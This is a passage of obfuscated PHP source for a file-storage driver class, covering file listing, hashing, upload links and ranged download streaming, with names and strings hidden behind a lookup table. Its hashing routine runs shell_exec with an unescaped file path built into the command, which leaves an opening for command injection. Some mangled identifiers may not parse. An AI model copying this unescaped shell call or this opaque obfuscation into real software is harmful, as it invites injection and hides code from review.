$çô¥´¯¥ =& $_SERVER[ÅÄÇĞô]; $ûßœ‘˜ = rtrim($èÆãš½, $çô¥´¯¥[8]) . $çô¥´¯¥[8] . $…íœÛ¥ò; $¢üë¶†ş = $this->exist($ûßœ‘˜); return $¢üë¶†ş ? $ûßœ‘˜ : !1; } public function setModifyTime($ÍçµÉŠ–, $Œ×øÅ = '') { } public function renameObject($Õ¬˜©£Á, $¿ããß§) { $½­Ó€Ê = $¿ããß§; $Õ¬˜©£Á = $this->getPathOuter($Õ¬˜©£Á); $¿ããß§ = $this->pathFather($Õ¬˜©£Á) . $¿ããß§; $×âØŸ = IO::copy($Õ¬˜©£Á, $this->pathFather($Õ¬˜©£Á), REPEAT_RENAME_FOLDER, $½­Ó€Ê); if ($×âØŸ) { IO::remove($Õ¬˜©£Á); } return $×âØŸ ? $¿ããß§ : !1; } public function tempFile($ŠÑçŸ‰½ = '', $íœ’ŸÖ§ = '') { if (!$ŠÑçŸ‰½) { $ŠÑçŸ‰½ = rand_string(15); } $¿ë€ù‰ = TEMP_FILES . rand_string(15) . $_SERVER[ÅÄÇĞô][8]; @mkdir($¿ë€ù‰, DEFAULT_PERRMISSIONS, !0); $ë„Œ’»‰ = $¿ë€ù‰ . $ŠÑçŸ‰½; @touch($ë„Œ’»‰); if ($íœ’ŸÖ§) { file_put_contents($ë„Œ’»‰, $íœ’ŸÖ§); } return $ë„Œ’»‰; } public function tempFileRemve($Îº§™áê) { @unlink($Îº§™áê); @rmdir($this->pathFather($Îº§™áê)); } public function mkfile($¶ÍÒõÔ¡, $¸Ş–Òí = '', $–’º¸£ = REPEAT_RENAME) { } public function mkdir($ùà®­ú, $ğÔƒÃ† = REPEAT_SKIP) { } public function delFile($ìî«Ëò¨) { } public function delFolder($¦ÊØú®Ş) { } public function copyFile($ÅŸÊÁ¾ñ, $°²ŒÅ‡Û) { } public function moveFile($æÜõìƒû, $ì¬Ñšå) { } public function remove($î±¡úøš) { if ($this->isFile($î±¡úøš)) { return $this->delFile($î±¡úøš); } return $this->delFolder($î±¡úøš); } public function rename($°×¨òı¾, $¬¡ŒºÂÓ) { } public function exist($¥ñøˆÂ) { } public function findByHash($Ûéæ‘ïÁ = '', $şè£§Ú = '') { return !1; } public function isFile($€«¤ŒĞÌ) { } public function isFolder($ûóÔòÍ) { } public function size($ÓèüÎ–‡) { } public function info($ºùŞŞŠã) { } public function infoSimple($­îûì›É) { return $this->info($­îûì›É); } public function infoAuth($Ø€Şµ–®) { return $this->info($Ø€Şµ–®); } public function infoFull($ŸŒÊ±í±) { return $this->info($ŸŒÊ±í±); } public function infoFullSimple($İÖÇœ…¥) { return $this->info($İÖÇœ…¥); } public function infoWithChildren($ª÷¦ÎÔ) { $ÔŒ½Àñë =& $_SERVER[ÅÄÇĞô]; static $öãæ÷Çß = array(); if (isset($öãæ÷Çß[$ª÷¦ÎÔ])) { return $öãæ÷Çß[$ª÷¦ÎÔ]; } $è°„³ÏŠ = $this->info($ª÷¦ÎÔ); if ($è°„³ÏŠ && $è°„³ÏŠ[$ÔŒ½Àñë[33]] == $ÔŒ½Àñë[78]) { $³ç²åğ = array($ÔŒ½Àñë[79] => 0, $ÔŒ½Àñë[80] => 0, $ÔŒ½Àñë[81] => 0); $this->infoChildren($ª÷¦ÎÔ, $³ç²åğ); $è°„³ÏŠ[$ÔŒ½Àñë[79]] = $³ç²åğ[$ÔŒ½Àñë[79]]; $è°„³ÏŠ[$ÔŒ½Àñë[82]] = array($ÔŒ½Àñë[83] => $³ç²åğ[$ÔŒ½Àñë[80]], $ÔŒ½Àñë[84] => $³ç²åğ[$ÔŒ½Àñë[81]]); $öãæ÷Çß[$ª÷¦ÎÔ] = $è°„³ÏŠ; } return $è°„³ÏŠ; } public function listPath($òÅ¹íîô, $ßøİ¤‡Ç = false) { } public function has($¹öÊ¶Æ, $ÂÓ°ÑÚ˜ = false, $Í–¢Á°± = false) { } public function canRead($×¥¹) { } public function canWrite($êçêÈ¬) { } public function getContent($ÓÑÓÁ—) { } public function setContent($Ñå›Ìµ®, $¡äë™æÉ = '') { } protected function infoChildren($¾æã·×œ, &$áÙÓ¬¬) { $ÖááÙé× =& $_SERVER[ÅÄÇĞô]; check_abort_echo(); $™û¼Ÿş‚ = $this->listPath($¾æã·×œ, !0); $™û¼Ÿş‚ = array_merge($™û¼Ÿş‚[$ÖááÙé×[85]], $™û¼Ÿş‚[$ÖááÙé×[86]]); foreach ($™û¼Ÿş‚ as $Ä’şøÙ) { if ($Ä’şøÙ[$ÖááÙé×[33]] == $ÖááÙé×[78]) { $áÙÓ¬¬[$ÖááÙé×[81]]++; $Çà¹§€é = $this->getPathInner($Ä’şøÙ[$ÖááÙé×[87]]); $this->infoChildren($Çà¹§€é, $áÙÓ¬¬); } else { $áÙÓ¬¬[$ÖááÙé×[80]]++; $áÙÓ¬¬[$ÖááÙé×[79]] += $Ä’şøÙ[$ÖááÙé×[79]]; } } } public function fileSubstr($éÑ§òÎæ, $™æôæÍÄ, $½æ†«øÃ) { } public function listAll($—–Æ¨Ã) { } public function listAllMake($ş•Å¿³¦, &$ÖÌÎÒ™É) { $©µã¿¤´ =& $_SERVER[ÅÄÇĞô]; check_abort_echo(); $ÉìÁ«ºˆ = $this->listPath($ş•Å¿³¦, !0); if (!$ÉìÁ«ºˆ) { return; } $µİÅØØì = array_merge($ÉìÁ«ºˆ[$©µã¿¤´[85]], $ÉìÁ«ºˆ[$©µã¿¤´[86]]); foreach ($µİÅØØì as $ùá·´) { $³¿àª»³ = $ùá·´[$©µã¿¤´[33]] == $©µã¿¤´[78]; $ç°±Ñ²£ = array($©µã¿¤´[87] => $ùá·´[$©µã¿¤´[87]], $©µã¿¤´[78] => $³¿àª»³); if (isset($ùá·´[$©µã¿¤´[79]])) { $ç°±Ñ²£[$©µã¿¤´[79]] = $ùá·´[$©µã¿¤´[79]]; } if (isset($ùá·´[$©µã¿¤´[88]])) { $ç°±Ñ²£[$©µã¿¤´[88]] = $ùá·´[$©µã¿¤´[88]]; } if (!$³¿àª»³) { $ÖÌÎÒ™É[] = $ç°±Ñ²£; continue; } $ÖÌÎÒ™É[] = $ç°±Ñ²£; $ì´ú›Ù = $ùá·´[$©µã¿¤´[87]]; $––¾‚¨ø = $this->pathDriver; if (substr($ùá·´[$©µã¿¤´[87]], 0, strlen($––¾‚¨ø)) == $––¾‚¨ø) { $ì´ú›Ù = substr($ì´ú›Ù, strlen($––¾‚¨ø)); } $this->listAllMake($ì´ú›Ù, $ÖÌÎÒ™É); } } public function listAllSimple($Í¿¬È æ, $éö©¢³ = false) { $¢¾É€ˆö = $this->listAll($Í¿¬È æ); return $this->listAllSimpleMake($¢¾É€ˆö, $this->getPathOuter($Í¿¬È æ), $éö©¢³); } public function listAllSimpleMake($®ª÷Ş…, $—¥Úù×, $ñÅ–µ€) { $ÉÈ±°Ü‹ =& $_SERVER[ÅÄÇĞô]; $Å¢’ö¤Ï = array(); $—¥Úù× = rtrim(get_path_father($—¥Úù×), $ÉÈ±°Ü‹[8]) . $ÉÈ±°Ü‹[8]; foreach ($®ª÷Ş… as $¶ÏèÀÚ) { $øŠÖ×çŸ = array($ÉÈ±°Ü‹[87] => $¶ÏèÀÚ[$ÉÈ±°Ü‹[87]], $ÉÈ±°Ü‹[89] => $¶ÏèÀÚ[$ÉÈ±°Ü‹[87]], $ÉÈ±°Ü‹[78] => $¶ÏèÀÚ[$ÉÈ±°Ü‹[78]]); if (isset($¶ÏèÀÚ[$ÉÈ±°Ü‹[79]]) && !$¶ÏèÀÚ[$ÉÈ±°Ü‹[78]]) { $øŠÖ×çŸ[$ÉÈ±°Ü‹[79]] = $¶ÏèÀÚ[$ÉÈ±°Ü‹[79]]; } if (isset($¶ÏèÀÚ[$ÉÈ±°Ü‹[88]])) { $øŠÖ×çŸ[$ÉÈ±°Ü‹[88]] = $¶ÏèÀÚ[$ÉÈ±°Ü‹[88]]; } if (is_array($¶ÏèÀÚ[$ÉÈ±°Ü‹[90]])) { $øŠÖ×çŸ[$ÉÈ±°Ü‹[89]] = $¶ÏèÀÚ[$ÉÈ±°Ü‹[90]][$ÉÈ±°Ü‹[87]]; $øŠÖ×çŸ[$ÉÈ±°Ü‹[79]] = $¶ÏèÀÚ[$ÉÈ±°Ü‹[90]][$ÉÈ±°Ü‹[79]]; $øŠÖ×çŸ[$ÉÈ±°Ü‹[88]] = $¶ÏèÀÚ[$ÉÈ±°Ü‹[90]][$ÉÈ±°Ü‹[88]]; } else { if (substr($¶ÏèÀÚ[$ÉÈ±°Ü‹[87]], 0, strlen($—¥Úù×)) == $—¥Úù×) { $øŠÖ×çŸ[$ÉÈ±°Ü‹[87]] = substr($¶ÏèÀÚ[$ÉÈ±°Ü‹[87]], strlen($—¥Úù×)); } } $ÚìÖ¹¿ = $¶ÏèÀÚ[$ÉÈ±°Ü‹[78]] ? $ÉÈ±°Ü‹[8] : $ÉÈ±°Ü‹[12]; $øŠÖ×çŸ[$ÉÈ±°Ü‹[89]] = rtrim($øŠÖ×çŸ[$ÉÈ±°Ü‹[89]], $ÉÈ±°Ü‹[8]) . $ÚìÖ¹¿; $øŠÖ×çŸ[$ÉÈ±°Ü‹[87]] = $ÉÈ±°Ü‹[8] . trim($øŠÖ×çŸ[$ÉÈ±°Ü‹[87]], $ÉÈ±°Ü‹[8]) . $ÚìÖ¹¿; if (!$ñÅ–µ€) { $¿ø‡Ó½½ = explode($ÉÈ±°Ü‹[8], trim($øŠÖ×çŸ[$ÉÈ±°Ü‹[87]], $ÉÈ±°Ü‹[8])); $øŠÖ×çŸ[$ÉÈ±°Ü‹[87]] = $ÉÈ±°Ü‹[8] . implode($ÉÈ±°Ü‹[8], array_slice($¿ø‡Ó½½, 1)) . $ÚìÖ¹¿; } $Å¢’ö¤Ï[] = $øŠÖ×çŸ; } return array_sort_by($Å¢’ö¤Ï, $ÉÈ±°Ü‹[87]); } public function upload($ÔúØ–ùˆ, $™¢ŒÁ•ü, $´Œ’ÜûÓ = false, $±Õ¶ÕØğ = REPEAT_REPLACE) { } public function uploadFileByID($±ÕÙ—ä, $Šßê“, $È¤ô‹Ø£) { } public function uploadFileByPath($ÓÎî¥åÅ, $Ò¹ıëÖï, $…ÅĞÏ® = array()) { } public function isUploadServer() { $èœĞÏ­ğ =& $_SERVER[ÅÄÇĞô]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $èœĞÏ­ğ[91]) { return !0; } return $GLOBALS[$èœĞÏ­ğ[6]][$èœĞÏ­ğ[92]][$èœĞÏ­ğ[93]]; } public function isFileOutServer() { $üĞÂÎô =& $_SERVER[ÅÄÇĞô]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $üĞÂÎô[91]) { return !0; } return $GLOBALS[$üĞÂÎô[6]][$üĞÂÎô[92]][$üĞÂÎô[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ñª°†Èö) { $×ı£ĞÖ’ =& $_SERVER[ÅÄÇĞô]; if (!$this->isCdnHost()) { return $Ñª°†Èö; } return str_replace(trim(get_url_root($Ñª°†Èö), $×ı£ĞÖ’[8]), trim($this->cdnHost, $×ı£ĞÖ’[8]), $Ñª°†Èö); } public function uploadLink($÷Ï°„‘À, $€²¨–¶– = 0) { $ç´ñİşø =& $_SERVER[ÅÄÇĞô]; if ($this->isUploadServer()) { return; } $‰‡ì¨ – = $this->getType(); if (!in_array($‰‡ì¨ –, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $„­´º—Û = 1024 * 1024 * 10; $Ö¹ú¦¶Ğ = $€²¨–¶– <= $„­´º—Û ? $ç´ñİşø[95] : $ç´ñİşø[96]; $‡éÜ×ÅÏ = (!$€²¨–¶– ? 1 : ceil($€²¨–¶– / pow(1024, 3))) * 3600 * 4; $­ÜÀµ”à = $this->{$Ö¹ú¦¶Ğ}($÷Ï°„‘À, $‡éÜ×ÅÏ); if ($­ÜÀµ”à) { $­ÜÀµ”à[$ç´ñİşø[97]] = $÷Ï°„‘À; $­ÜÀµ”à[$ç´ñİşø[98]] = $‰‡ì¨ –; } return $­ÜÀµ”à; } public function uploadFormData($ÂôÕ²®², $ğ§Š±øÄ = 3600) { } public function uploadMultiData($ìäûÄ€¿, $ñÉœÌÏ¼ = 3600) { } public function multiUploadFormData($÷ç€¯šİ, $–·Ã¡ïö = 3600) { return $this->uploadMultiData($÷ç€¯šİ, $–·Ã¡ïö); } public function download($ÜÖ¥‘ÉÄ, $¤ñÊ£Û) { } public function ext($×’ÛŞÕ ) { $Á¸˜ˆ¾¿ =& $_SERVER[ÅÄÇĞô]; if (strpos($×’ÛŞÕ , $Á¸˜ˆ¾¿[8]) === -1) { $Ä½¶æœ = $×’ÛŞÕ ; } else { $Ä½¶æœ = $this->pathThis($×’ÛŞÕ ); } $—­ûÁã = $Á¸˜ˆ¾¿[12]; if (strstr($Ä½¶æœ, $Á¸˜ˆ¾¿[10])) { $—­ûÁã = substr($Ä½¶æœ, strrpos($Ä½¶æœ, $Á¸˜ˆ¾¿[10]) + 1); $—­ûÁã = strtolower($—­ûÁã); } if (strlen($—­ûÁã) > 3 && preg_match($Á¸˜ˆ¾¿[99], $—­ûÁã, $ÔÔ‚÷…)) { $—­ûÁã = $Á¸˜ˆ¾¿[12]; } return $—­ûÁã; } public function pathThis($‡Š­Åƒø) { $¿Èèï Ì =& $_SERVER[ÅÄÇĞô]; $‡Š­Åƒø = str_replace($¿Èèï Ì[100], $¿Èèï Ì[8], rtrim($‡Š­Åƒø, $¿Èèï Ì[8])); $ì´²§Ğ = strrpos($‡Š­Åƒø, $¿Èèï Ì[8]); if ($ì´²§Ğ === !1) { return $‡Š­Åƒø; } return substr($‡Š­Åƒø, $ì´²§Ğ + 1); } public function pathFather($îÔ©¶ï®) { $Óï¤•™á =& $_SERVER[ÅÄÇĞô]; $îÔ©¶ï® = str_replace($Óï¤•™á[100], $Óï¤•™á[8], rtrim($îÔ©¶ï®, $Óï¤•™á[8])); $ï®Éã = strrpos($îÔ©¶ï®, $Óï¤•™á[8]); if ($ï®Éã === !1) { return $Óï¤•™á[12]; } return substr($îÔ©¶ï®, 0, $ï®Éã + 1); } public function hashSimple($»Üƒª”Ø) { $¨ì‘É‡è =& $_SERVER[ÅÄÇĞô]; if (!$»Üƒª”Ø) { return md5($¨ì‘É‡è[12]); } $éÅ¹ÉÆŸ = $this->size($»Üƒª”Ø); $ñ…æ€  = 200; $ÍøšÑè¸ = 50; if ($éÅ¹ÉÆŸ <= $ñ…æ€  * $ÍøšÑè¸) { return $this->hashMd5($»Üƒª”Ø) . $éÅ¹ÉÆŸ; } $×šâæ› = intval($éÅ¹ÉÆŸ / $ÍøšÑè¸); $ÏûÖü±î = $¨ì‘É‡è[12]; for ($’ÍÌâ§Š = 0; $’ÍÌâ§Š < $ÍøšÑè¸; $’ÍÌâ§Š++) { $ÏûÖü±î .= $this->fileSubstr($»Üƒª”Ø, $×šâæ› * $’ÍÌâ§Š, $ñ…æ€ ); } $ÏûÖü±î .= $this->fileSubstr($»Üƒª”Ø, $éÅ¹ÉÆŸ - $ñ…æ€ , $ñ…æ€ ); return md5($ÏûÖü±î) . $éÅ¹ÉÆŸ; } public static $md5Cache = array(); public function hashMd5($ÈœËŒÛ¡) { if (!$ÈœËŒÛ¡) { return md5($_SERVER[ÅÄÇĞô][12]); } $ÈœËŒÛ¡ = $this->iconvSystem($ÈœËŒÛ¡); if (isset(self::$md5Cache[$ÈœËŒÛ¡])) { return self::$md5Cache[$ÈœËŒÛ¡]; } self::$md5Cache[$ÈœËŒÛ¡] = $this->hashMd5Shell($ÈœËŒÛ¡); if (!self::$md5Cache[$ÈœËŒÛ¡]) { self::$md5Cache[$ÈœËŒÛ¡] = @md5_file($ÈœËŒÛ¡); } return self::$md5Cache[$ÈœËŒÛ¡]; } private function hashMd5Shell($Ò¼¼ş¡) { $ƒÎ¼¡‹ =& $_SERVER[ÅÄÇĞô]; if (!$Ò¼¼ş¡) { return md5($ƒÎ¼¡‹[12]); } if (!function_exists($ƒÎ¼¡‹[101])) { return !1; } $¹¨Üßé = array($ƒÎ¼¡‹[102], $ƒÎ¼¡‹[103]); $ÛèûÚÒ  = Cache::get($ƒÎ¼¡‹[104]); if (!$ÛèûÚÒ ) { $¥¾Ø©«ù = BASIC_PATH . $ƒÎ¼¡‹[105]; $­ß£ºÉ = md5_file($¥¾Ø©«ù); $ÛèûÚÒ  = $ƒÎ¼¡‹[106]; foreach ($¹¨Üßé as $‡œÆ†Ñ‚) { $–öèİî² = shell_exec($‡œÆ†Ñ‚ . "\40\42{$¥¾Ø©«ù}\x22"); if ($–öèİî² && substr(trim($–öèİî²), 0, 32) == $­ß£ºÉ) { $ÛèûÚÒ  = $‡œÆ†Ñ‚; break; } } Cache::set($ƒÎ¼¡‹[104], $ÛèûÚÒ , 3600); } if ($ÛèûÚÒ  == $ƒÎ¼¡‹[106]) { return !1; } $–öèİî² = shell_exec($ÛèûÚÒ  . "\40\42{$Ò¼¼ş¡}\42"); $–öèİî² = str_replace($ƒÎ¼¡‹[107], $ƒÎ¼¡‹[12], $–öèİî²); return substr($–öèİî², 0, 32); } public function link($ƒÍ‰èÃ) { return $ƒÍ‰èÃ; } public function fileOut($û· ¾Ÿ¥, $¡Óä‚Ï = false, $Ç‘Ã²‰ş = false, $ù÷ˆ¡İñ = '') { $˜—íÕ¨ä =& $_SERVER[ÅÄÇĞô]; $this->cacheMethod(null, null); if (!$û· ¾Ÿ¥ || !$this->exist($û· ¾Ÿ¥)) { show_json(LNG($˜—íÕ¨ä[108]), !1, $Ç‘Ã²‰ş); } $¸ëêŠÉ = $this->getType() == $˜—íÕ¨ä[109]; $×ÑäéÔ = $GLOBALS[$˜—íÕ¨ä[6]][$˜—íÕ¨ä[92]][$˜—íÕ¨ä[110]][$˜—íÕ¨ä[111]]; $í—ÃÈíû = (double) $GLOBALS[$˜—íÕ¨ä[6]][$˜—íÕ¨ä[92]][$˜—íÕ¨ä[110]][$˜—íÕ¨ä[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÛÅ¬Š³÷ = $this->infoFull($û· ¾Ÿ¥); $ãÖ…ÈÇÒ = $ÛÅ¬Š³÷[$˜—íÕ¨ä[79]]; $ªŒŸı­ = gmdate($˜—íÕ¨ä[113], $ÛÅ¬Š³÷[$˜—íÕ¨ä[88]]); $¼—ŠÙìˆ = $Ç‘Ã²‰ş ? $Ç‘Ã²‰ş : $this->iconvApp($ÛÅ¬Š³÷[$˜—íÕ¨ä[32]]); $×Â×ñ´ú = 0; $ëŞÃ…Ÿ§ = $ãÖ…ÈÇÒ - 1; $Æ‘üŸ¾€ = $this->ext($¼—ŠÙìˆ); if (in_array($Æ‘üŸ¾€, array($˜—íÕ¨ä[114], $˜—íÕ¨ä[115], $˜—íÕ¨ä[116], $˜—íÕ¨ä[117]))) { $Æ‘üŸ¾€ = $˜—íÕ¨ä[118]; } if (in_array($Æ‘üŸ¾€, array($˜—íÕ¨ä[119]))) { $Æ‘üŸ¾€ = $˜—íÕ¨ä[120]; } if (!$ù÷ˆ¡İñ) { $ù÷ˆ¡İñ = md5($ªŒŸı­ . $ãÖ…ÈÇÒ); } $ù÷ˆ¡İñ = $˜—íÕ¨ä[121] . $ù÷ˆ¡İñ . $˜—íÕ¨ä[121]; $–ğ÷ÕÃ— = get_file_mime($Æ‘üŸ¾€); $¬«È† = !0; $¬«È† = isset($_GET[$˜—íÕ¨ä[122]]) ? !1 : !0; if ($¡Óä‚Ï === !1 && !mime_support($–ğ÷ÕÃ—)) { $–ğ÷ÕÃ— = $˜—íÕ¨ä[123]; } header($˜—íÕ¨ä[124]); header($˜—íÕ¨ä[125] . $–ğ÷ÕÃ—); $ÍúÏ˜‰› = rawurlencode($¼—ŠÙìˆ); $ÍúÏ˜‰› = $˜—íÕ¨ä[121] . $ÍúÏ˜‰› . $˜—íÕ¨ä[126] . $ÍúÏ˜‰›; if ($¡Óä‚Ï) { header($˜—íÕ¨ä[127]); header($˜—íÕ¨ä[128] . $ÍúÏ˜‰›); } else { if ($¬«È†) { header($˜—íÕ¨ä[129] . $ÍúÏ˜‰›); } } $â£¡¾Ì = 3600 * 24 * 30; header($˜—íÕ¨ä[130]); header($˜—íÕ¨ä[131]); header($˜—íÕ¨ä[132] . $â£¡¾Ì); header($˜—íÕ¨ä[133] . gmdate($˜—íÕ¨ä[113], time() + $â£¡¾Ì) . $˜—íÕ¨ä[134]); if (isset($_SERVER[$˜—íÕ¨ä[135]]) && strtotime($_SERVER[$˜—íÕ¨ä[135]]) == $ÛÅ¬Š³÷[$˜—íÕ¨ä[88]]) { header($˜—íÕ¨ä[136], !0, 304); die; } if (isset($_SERVER[$˜—íÕ¨ä[137]]) && $_SERVER[$˜—íÕ¨ä[137]] == $ù÷ˆ¡İñ) { header($˜—íÕ¨ä[138] . $ù÷ˆ¡İñ, !0, 304); die; } header($˜—íÕ¨ä[138] . $ù÷ˆ¡İñ); header($˜—íÕ¨ä[139] . $ªŒŸı­ . $˜—íÕ¨ä[134]); header($˜—íÕ¨ä[140] . $¼—ŠÙìˆ); header($˜—íÕ¨ä[141]); header($˜—íÕ¨ä[142] . $ãÖ…ÈÇÒ); header($˜—íÕ¨ä[143]); Hook::trigger($˜—íÕ¨ä[144], $û· ¾Ÿ¥, $ãÖ…ÈÇÒ, $¼—ŠÙìˆ, $Æ‘üŸ¾€); if (!$¡Óä‚Ï && $Æ‘üŸ¾€ == $˜—íÕ¨ä[145]) { if ($ãÖ…ÈÇÒ > 1024 * 1024 * 5) { die; } $·Şªµç = $this->getContent($û· ¾Ÿ¥); $·Şªµç = Html::clearSVG($·Şªµç); header($˜—íÕ¨ä[146] . strlen($·Şªµç)); echo $·Şªµç; die; } $™ÆÍÅÖ‚ = strtolower($_SERVER[$˜—íÕ¨ä[147]]); if ($¸ëêŠÉ && $™ÆÍÅÖ‚ && $×ÑäéÔ) { if (strstr($™ÆÍÅÖ‚, $˜—íÕ¨ä[148])) { header($˜—íÕ¨ä[149] . $û· ¾Ÿ¥); } else { if (strstr($™ÆÍÅÖ‚, $˜—íÕ¨ä[150])) { header($˜—íÕ¨ä[151] . $û· ¾Ÿ¥); } else { if (strstr($™ÆÍÅÖ‚, $˜—íÕ¨ä[152])) { header($˜—íÕ¨ä[153] . $û· ¾Ÿ¥); } } } if ($í—ÃÈíû) { header($˜—íÕ¨ä[154] . $í—ÃÈíû); } return; } if (isset($_SERVER[$˜—íÕ¨ä[155]])) { if (preg_match($˜—íÕ¨ä[156], $_SERVER[$˜—íÕ¨ä[155]], $‘ë¯×š)) { $×Â×ñ´ú = intval($‘ë¯×š[1]); $×Â×ñ´ú = $×Â×ñ´ú <= 0 ? 0 : ($×Â×ñ´ú >= $ëŞÃ…Ÿ§ ? $ëŞÃ…Ÿ§ : $×Â×ñ´ú); if (!empty($‘ë¯×š[2])) { $‘ßš›ãÌ = intval($‘ë¯×š[2]); $ëŞÃ…Ÿ§ = $‘ßš›ãÌ < $×Â×ñ´ú ? $×Â×ñ´ú : ($‘ßš›ãÌ >= $ëŞÃ…Ÿ§ ? $ëŞÃ…Ÿ§ : $‘ßš›ãÌ); } } header($˜—íÕ¨ä[157]); header("\x43\157\x6e\164\145\156\x74\x2d\x52\141\x6e\147\x65\72\x20\142\x79\164\145\163\x20{$×Â×ñ´ú}\x2d{$ëŞÃ…Ÿ§}\x2f" . $ãÖ…ÈÇÒ); } else { header($˜—íÕ¨ä[158]); } header($˜—íÕ¨ä[159]); header($˜—íÕ¨ä[160]); $ğ°¤©óá = !0; if ($_SERVER[$˜—íÕ¨ä[161]] == $˜—íÕ¨ä[162] && $ãÖ…ÈÇÒ > 1204 * 1024 * 1024 * 2) { $ğ°¤©óá = !1; } if ($ğ°¤©óá) { header($˜—íÕ¨ä[163] . ($ëŞÃ…Ÿ§ - $×Â×ñ´ú + 1)); } if ($_SERVER[$˜—íÕ¨ä[164]] == $˜—íÕ¨ä[165]) { return; } $ÏıßÜ»Ü = array($˜—íÕ¨ä[166] => !1, $˜—íÕ¨ä[167] => $×Â×ñ´ú, $˜—íÕ¨ä[168] => $ëŞÃ…Ÿ§, $˜—íÕ¨ä[169] => $Æ‘üŸ¾€, $˜—íÕ¨ä[170] => $ÛÅ¬Š³÷, $˜—íÕ¨ä[171] => $˜—íÕ¨ä[12], $˜—íÕ¨ä[172] => 0); $ÏıßÜ»Ü = Hook::filter($˜—íÕ¨ä[173], $ÏıßÜ»Ü); $”Ò±Şí‹ = 1024 * 300; $õšõºä = 0; if ($í—ÃÈíû) { $õšõºä = intval(1000 * 1000 * ($”Ò±Şí‹ / $í—ÃÈíû)); } while ($×Â×ñ´ú <= $ëŞÃ…Ÿ§) { $„ïà†Üš = timeFloat(); check_abort(); $åº¿º‹Ö = $ëŞÃ…Ÿ§ - $×Â×ñ´ú + 1; if ($åº¿º‹Ö <= $”Ò±Şí‹) { $”Ò±Şí‹ = $åº¿º‹Ö; } $·Şªµç = $this->fileSubstr($û· ¾Ÿ¥, $×Â×ñ´ú, $”Ò±Şí‹); if ($ÏıßÜ»Ü[$˜—íÕ¨ä[166]]) { $ÏıßÜ»Ü[$˜—íÕ¨ä[171]] = $·Şªµç; $ÏıßÜ»Ü[$˜—íÕ¨ä[172]] = $×Â×ñ´ú; $ÏıßÜ»Ü = Hook::filter($˜—íÕ¨ä[174], $ÏıßÜ»Ü); $·Şªµç = $ÏıßÜ»Ü[$˜—íÕ¨ä[171]]; } echo $·Şªµç; $×Â×ñ´ú += $”Ò±Şí‹; if ($”Ò±Şí‹ == $åº¿º‹Ö) { $×Â×ñ´ú = $ëŞÃ…Ÿ§ + 1; } if ($õšõºä) { $Å¹àòÛë = intval(1000 * 1000 * (timeFloat() - $„ïà†Üš)); $‹ÍØ°øÑ = $õšõºä - $Å¹àòÛë; if ($‹ÍØ°øÑ > 5) { usleep($‹ÍØ°øÑ); } } } } public function fileOutServer($¨¿‚Àßî, $Ò¹Š”Ş¬ = false, $áƒ¶ı = false, $Áèè¦ıÖ = '') { $this->fileOut($¨¿‚Àßî, $Ò¹Š”Ş¬, $áƒ¶ı, $Áèè¦ıÖ); } public function fileOutLink($¨ÆËÎ†) { header($_SERVER[ÅÄÇĞô][175] . $¨ÆËÎ†); die; } public function cacheMethod($µ„íìÀ, $ïÁöÅù€, $ñŠõñ£› = null) { $÷µó·Á® =& $_SERVER[ÅÄÇĞô]; static $–˜¾ô¯å = array(); $¥èª·½î = $ïÁöÅù€ ? ltrim($this->getPathOuter($ïÁöÅù€), $÷µó·Á®[8]) : $÷µó·Á®[12]; $›Œş‚£Ê = $÷µó·Á®[176] . $µ„íìÀ . $÷µó·Á®[177] . rtrim($¥èª·½î, $÷µó·Á®[8]); if (is_null($µ„íìÀ)) { $–˜¾ô¯å = array(); return; } if (is_null($ïÁöÅù€)) { foreach ($–˜¾ô¯å as $›Œş‚£Ê => $Š‘åÑº—) { if (!strstr($›Œş‚£Ê, $÷µó·Á®[176] . $µ„íìÀ . $÷µó·Á®[178])) { continue; } unset($–˜¾ô¯å[$›Œş‚£Ê]); } return; } if ($ñŠõñ£› === $÷µó·Á®[179]) { unset($–˜¾ô¯å[$›Œş‚£Ê]); return; } if (!is_null($ñŠõñ£›)) { $–˜¾ô¯å[$›Œş‚£Ê] = $ñŠõñ£›; return; } $ôÏ¢ƒ‘ = isset($–˜¾ô¯å[$›Œş‚£Ê]) ? $–˜¾ô¯å[$›Œş‚£Ê] : null; if (!is_null($ôÏ¢ƒ‘)) { return $ôÏ¢ƒ‘; } $ôÏ¢ƒ‘ = $this->{$µ„íìÀ}($ïÁöÅù€); $–˜¾ô¯å[$›Œş‚£Ê] = $ôÏ¢ƒ‘; return $ôÏ¢ƒ‘; } public function cacheMethodInfoSet($û£ŸÌÁ, $°¼ˆÕ‚½, $¾ŠÔÁˆ = false) { $‹·çÇ¼ì =& $_SERVER[ÅÄÇĞô]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($‹·çÇ¼ì[180], $û£ŸÌÁ, $°¼ˆÕ‚½); $this->cacheMethod($‹·çÇ¼ì[181], $û£ŸÌÁ, $°¼ˆÕ‚½ ? !1 : !0); if (is_array($¾ŠÔÁˆ)) { $this->cacheMethod($‹·çÇ¼ì[182], $û£ŸÌÁ, $¾ŠÔÁˆ); } } public function fileOutImage($¢»Ê¿Ù¤, $±ó¥˜­· = 250) { $Ò¥ÙšÓ =& $_SERVER[ÅÄÇĞô]; set_timeout(); if (substr($¢»Ê¿Ù¤, 0, 4) == $Ò¥ÙšÓ[152]) { $this->fileOutLink($¢»Ê¿Ù¤); } $­¢¾÷ñÂ = $this->info($¢»Ê¿Ù¤); $öä¨ïÏ¤ = !1; $£öüïæ = isset($GLOBALS[$Ò¥ÙšÓ[183]]) ? $GLOBALS[$Ò¥ÙšÓ[183]] : array(); if ($£öüïæ && $£öüïæ[$Ò¥ÙšÓ[184]] == $­¢¾÷ñÂ[$Ò¥ÙšÓ[87]]) { $­¢¾÷ñÂ = $£öüïæ; $®úîƒŒğ = $­¢¾÷ñÂ[$Ò¥ÙšÓ[185]]; if ($®úîƒŒğ && isset($®úîƒŒğ[$Ò¥ÙšÓ[186]])) { if ($®úîƒŒğ[$Ò¥ÙšÓ[186]] <= $±ó¥˜­· && $®úîƒŒğ[$Ò¥ÙšÓ[187]] <= $±ó¥˜­·) { $öä¨ïÏ¤ = !0; } } } if ($­¢¾÷ñÂ[$Ò¥ÙšÓ[79]] <= 1024 * 50 || $öä¨ïÏ¤ || !function_exists($Ò¥ÙšÓ[188]) || 